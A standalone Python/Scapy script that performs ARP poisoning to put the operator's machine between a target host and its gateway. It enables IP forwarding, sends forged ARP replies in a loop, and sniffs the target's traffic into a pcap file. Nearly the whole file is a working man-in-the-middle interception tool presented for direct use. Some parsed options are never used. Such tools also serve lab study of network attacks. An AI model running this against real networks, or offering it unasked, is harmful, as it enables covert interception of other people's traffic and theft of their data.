from scapy.all import *
from optparse import OptionParser
import os
import signal
import sys
import threading
import time


# Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
# an ARP reply with MAC Address
def get_mac(ip_address):
    # ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    # Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s, r in resp:
        return r[ARP].hwsrc
    return None


# Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with
# correct MAC and IP Address information
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Disabling IP forwarding")
    # Disable IP Forwarding on a mac
    os.system("sysctl -w net.inet.ip.forwarding=0")
    # kill process on a mac
    os.kill(os.getpid(), signal.SIGTERM)


# Keep sending false ARP replies to put our machine in the middle to intercept packets
# This will use our interface MAC address as the hwsrc for the ARP reply
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(frequency)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)


if __name__ == '__main__':

    try:
        if os.geteuid() != 0:
            print("[*] Run me as root")
            sys.exit(1)
    except Exception as msg:
        print(msg)

    usage = 'Usage: %prog -i interface -t target -g gateway [-c count] [-f frequency]'
    parser = OptionParser(usage)
    parser.add_option('-i', dest='interface', help='Specify the interface to use')
    parser.add_option('-t', dest='target', help='Specify a particular host to ARP poison')
    parser.add_option('-g', dest='gateway', help='Specify the gateway to ARP poison')
    parser.add_option('-c', '--count', dest='count',default=0, help='Specify the packet count')
    parser.add_option('-f', '--frequency', dest='frequency',default=30, help='Specify the frequency of ARP ping')
    parser.add_option('-m', dest='mode', default='req',
                      help='Poisoning mode: requests (req) or replies (rep) [default: %default]')
    parser.add_option('-s', action='store_true', dest='summary', default=False,
                      help='Show packet summary and ask for confirmation before poisoning')
    (options, args) = parser.parse_args()
    if options.interface is None:
        parser.print_help()
        sys.exit(0)

    gateway_ip = options.gateway
    target_ip = options.target
    packet_count = options.count
    conf.iface = options.interface
    frequency = 60 / options.frequency
    conf.verb = 0

    # Start the script
    print("[*] Enabling IP forwarding")
    # Enable IP Forwarding on a mac
    os.system("sysctl -w net.inet.ip.forwarding=1")
    print(f"[*] Gateway IP address: {gateway_ip}")
    print(f"[*] Target IP address: {target_ip}")

    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print("[!] Unable to get gateway MAC address. Exiting..")
        sys.exit(0)
    else:
        print(f"[*] Gateway MAC address: {gateway_mac}")

    target_mac = get_mac(target_ip)
    if target_mac is None:
        print("[!] Unable to get target MAC address. Exiting..")
        sys.exit(0)
    else:
        print(f"[*] Target MAC address: {target_mac}")

    # ARP poison thread
    poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()

    # Sniff traffic and write to file. Capture is filtered on target machine
    if packet_count:
        try:
            sniff_filter = "ip host " + target_ip
            print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
            packets = sniff(filter=sniff_filter, iface=conf.iface, count=int(packet_count))
            for packet in packets:
                print(packet.summary())
            wrpcap(target_ip + "_capture.pcap", packets)
            print(f"[*] Stopping network capture..Restoring network")
            restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
        except KeyboardInterrupt:
            print(f"[*] Stopping network capture..Restoring network")
            restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
            sys.exit(0)
    else:
        sniff_filter = "ip host " + target_ip
        print(f"[*] Starting network capture. Filter: {sniff_filter}")
        while True:
            try:
                packet = sniff(filter=sniff_filter, iface=conf.iface, count=3)
                print(packet.summary())
            except KeyboardInterrupt:
                print(f"[*] Stopping network capture..Restoring network")
                restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
                sys.exit(0)

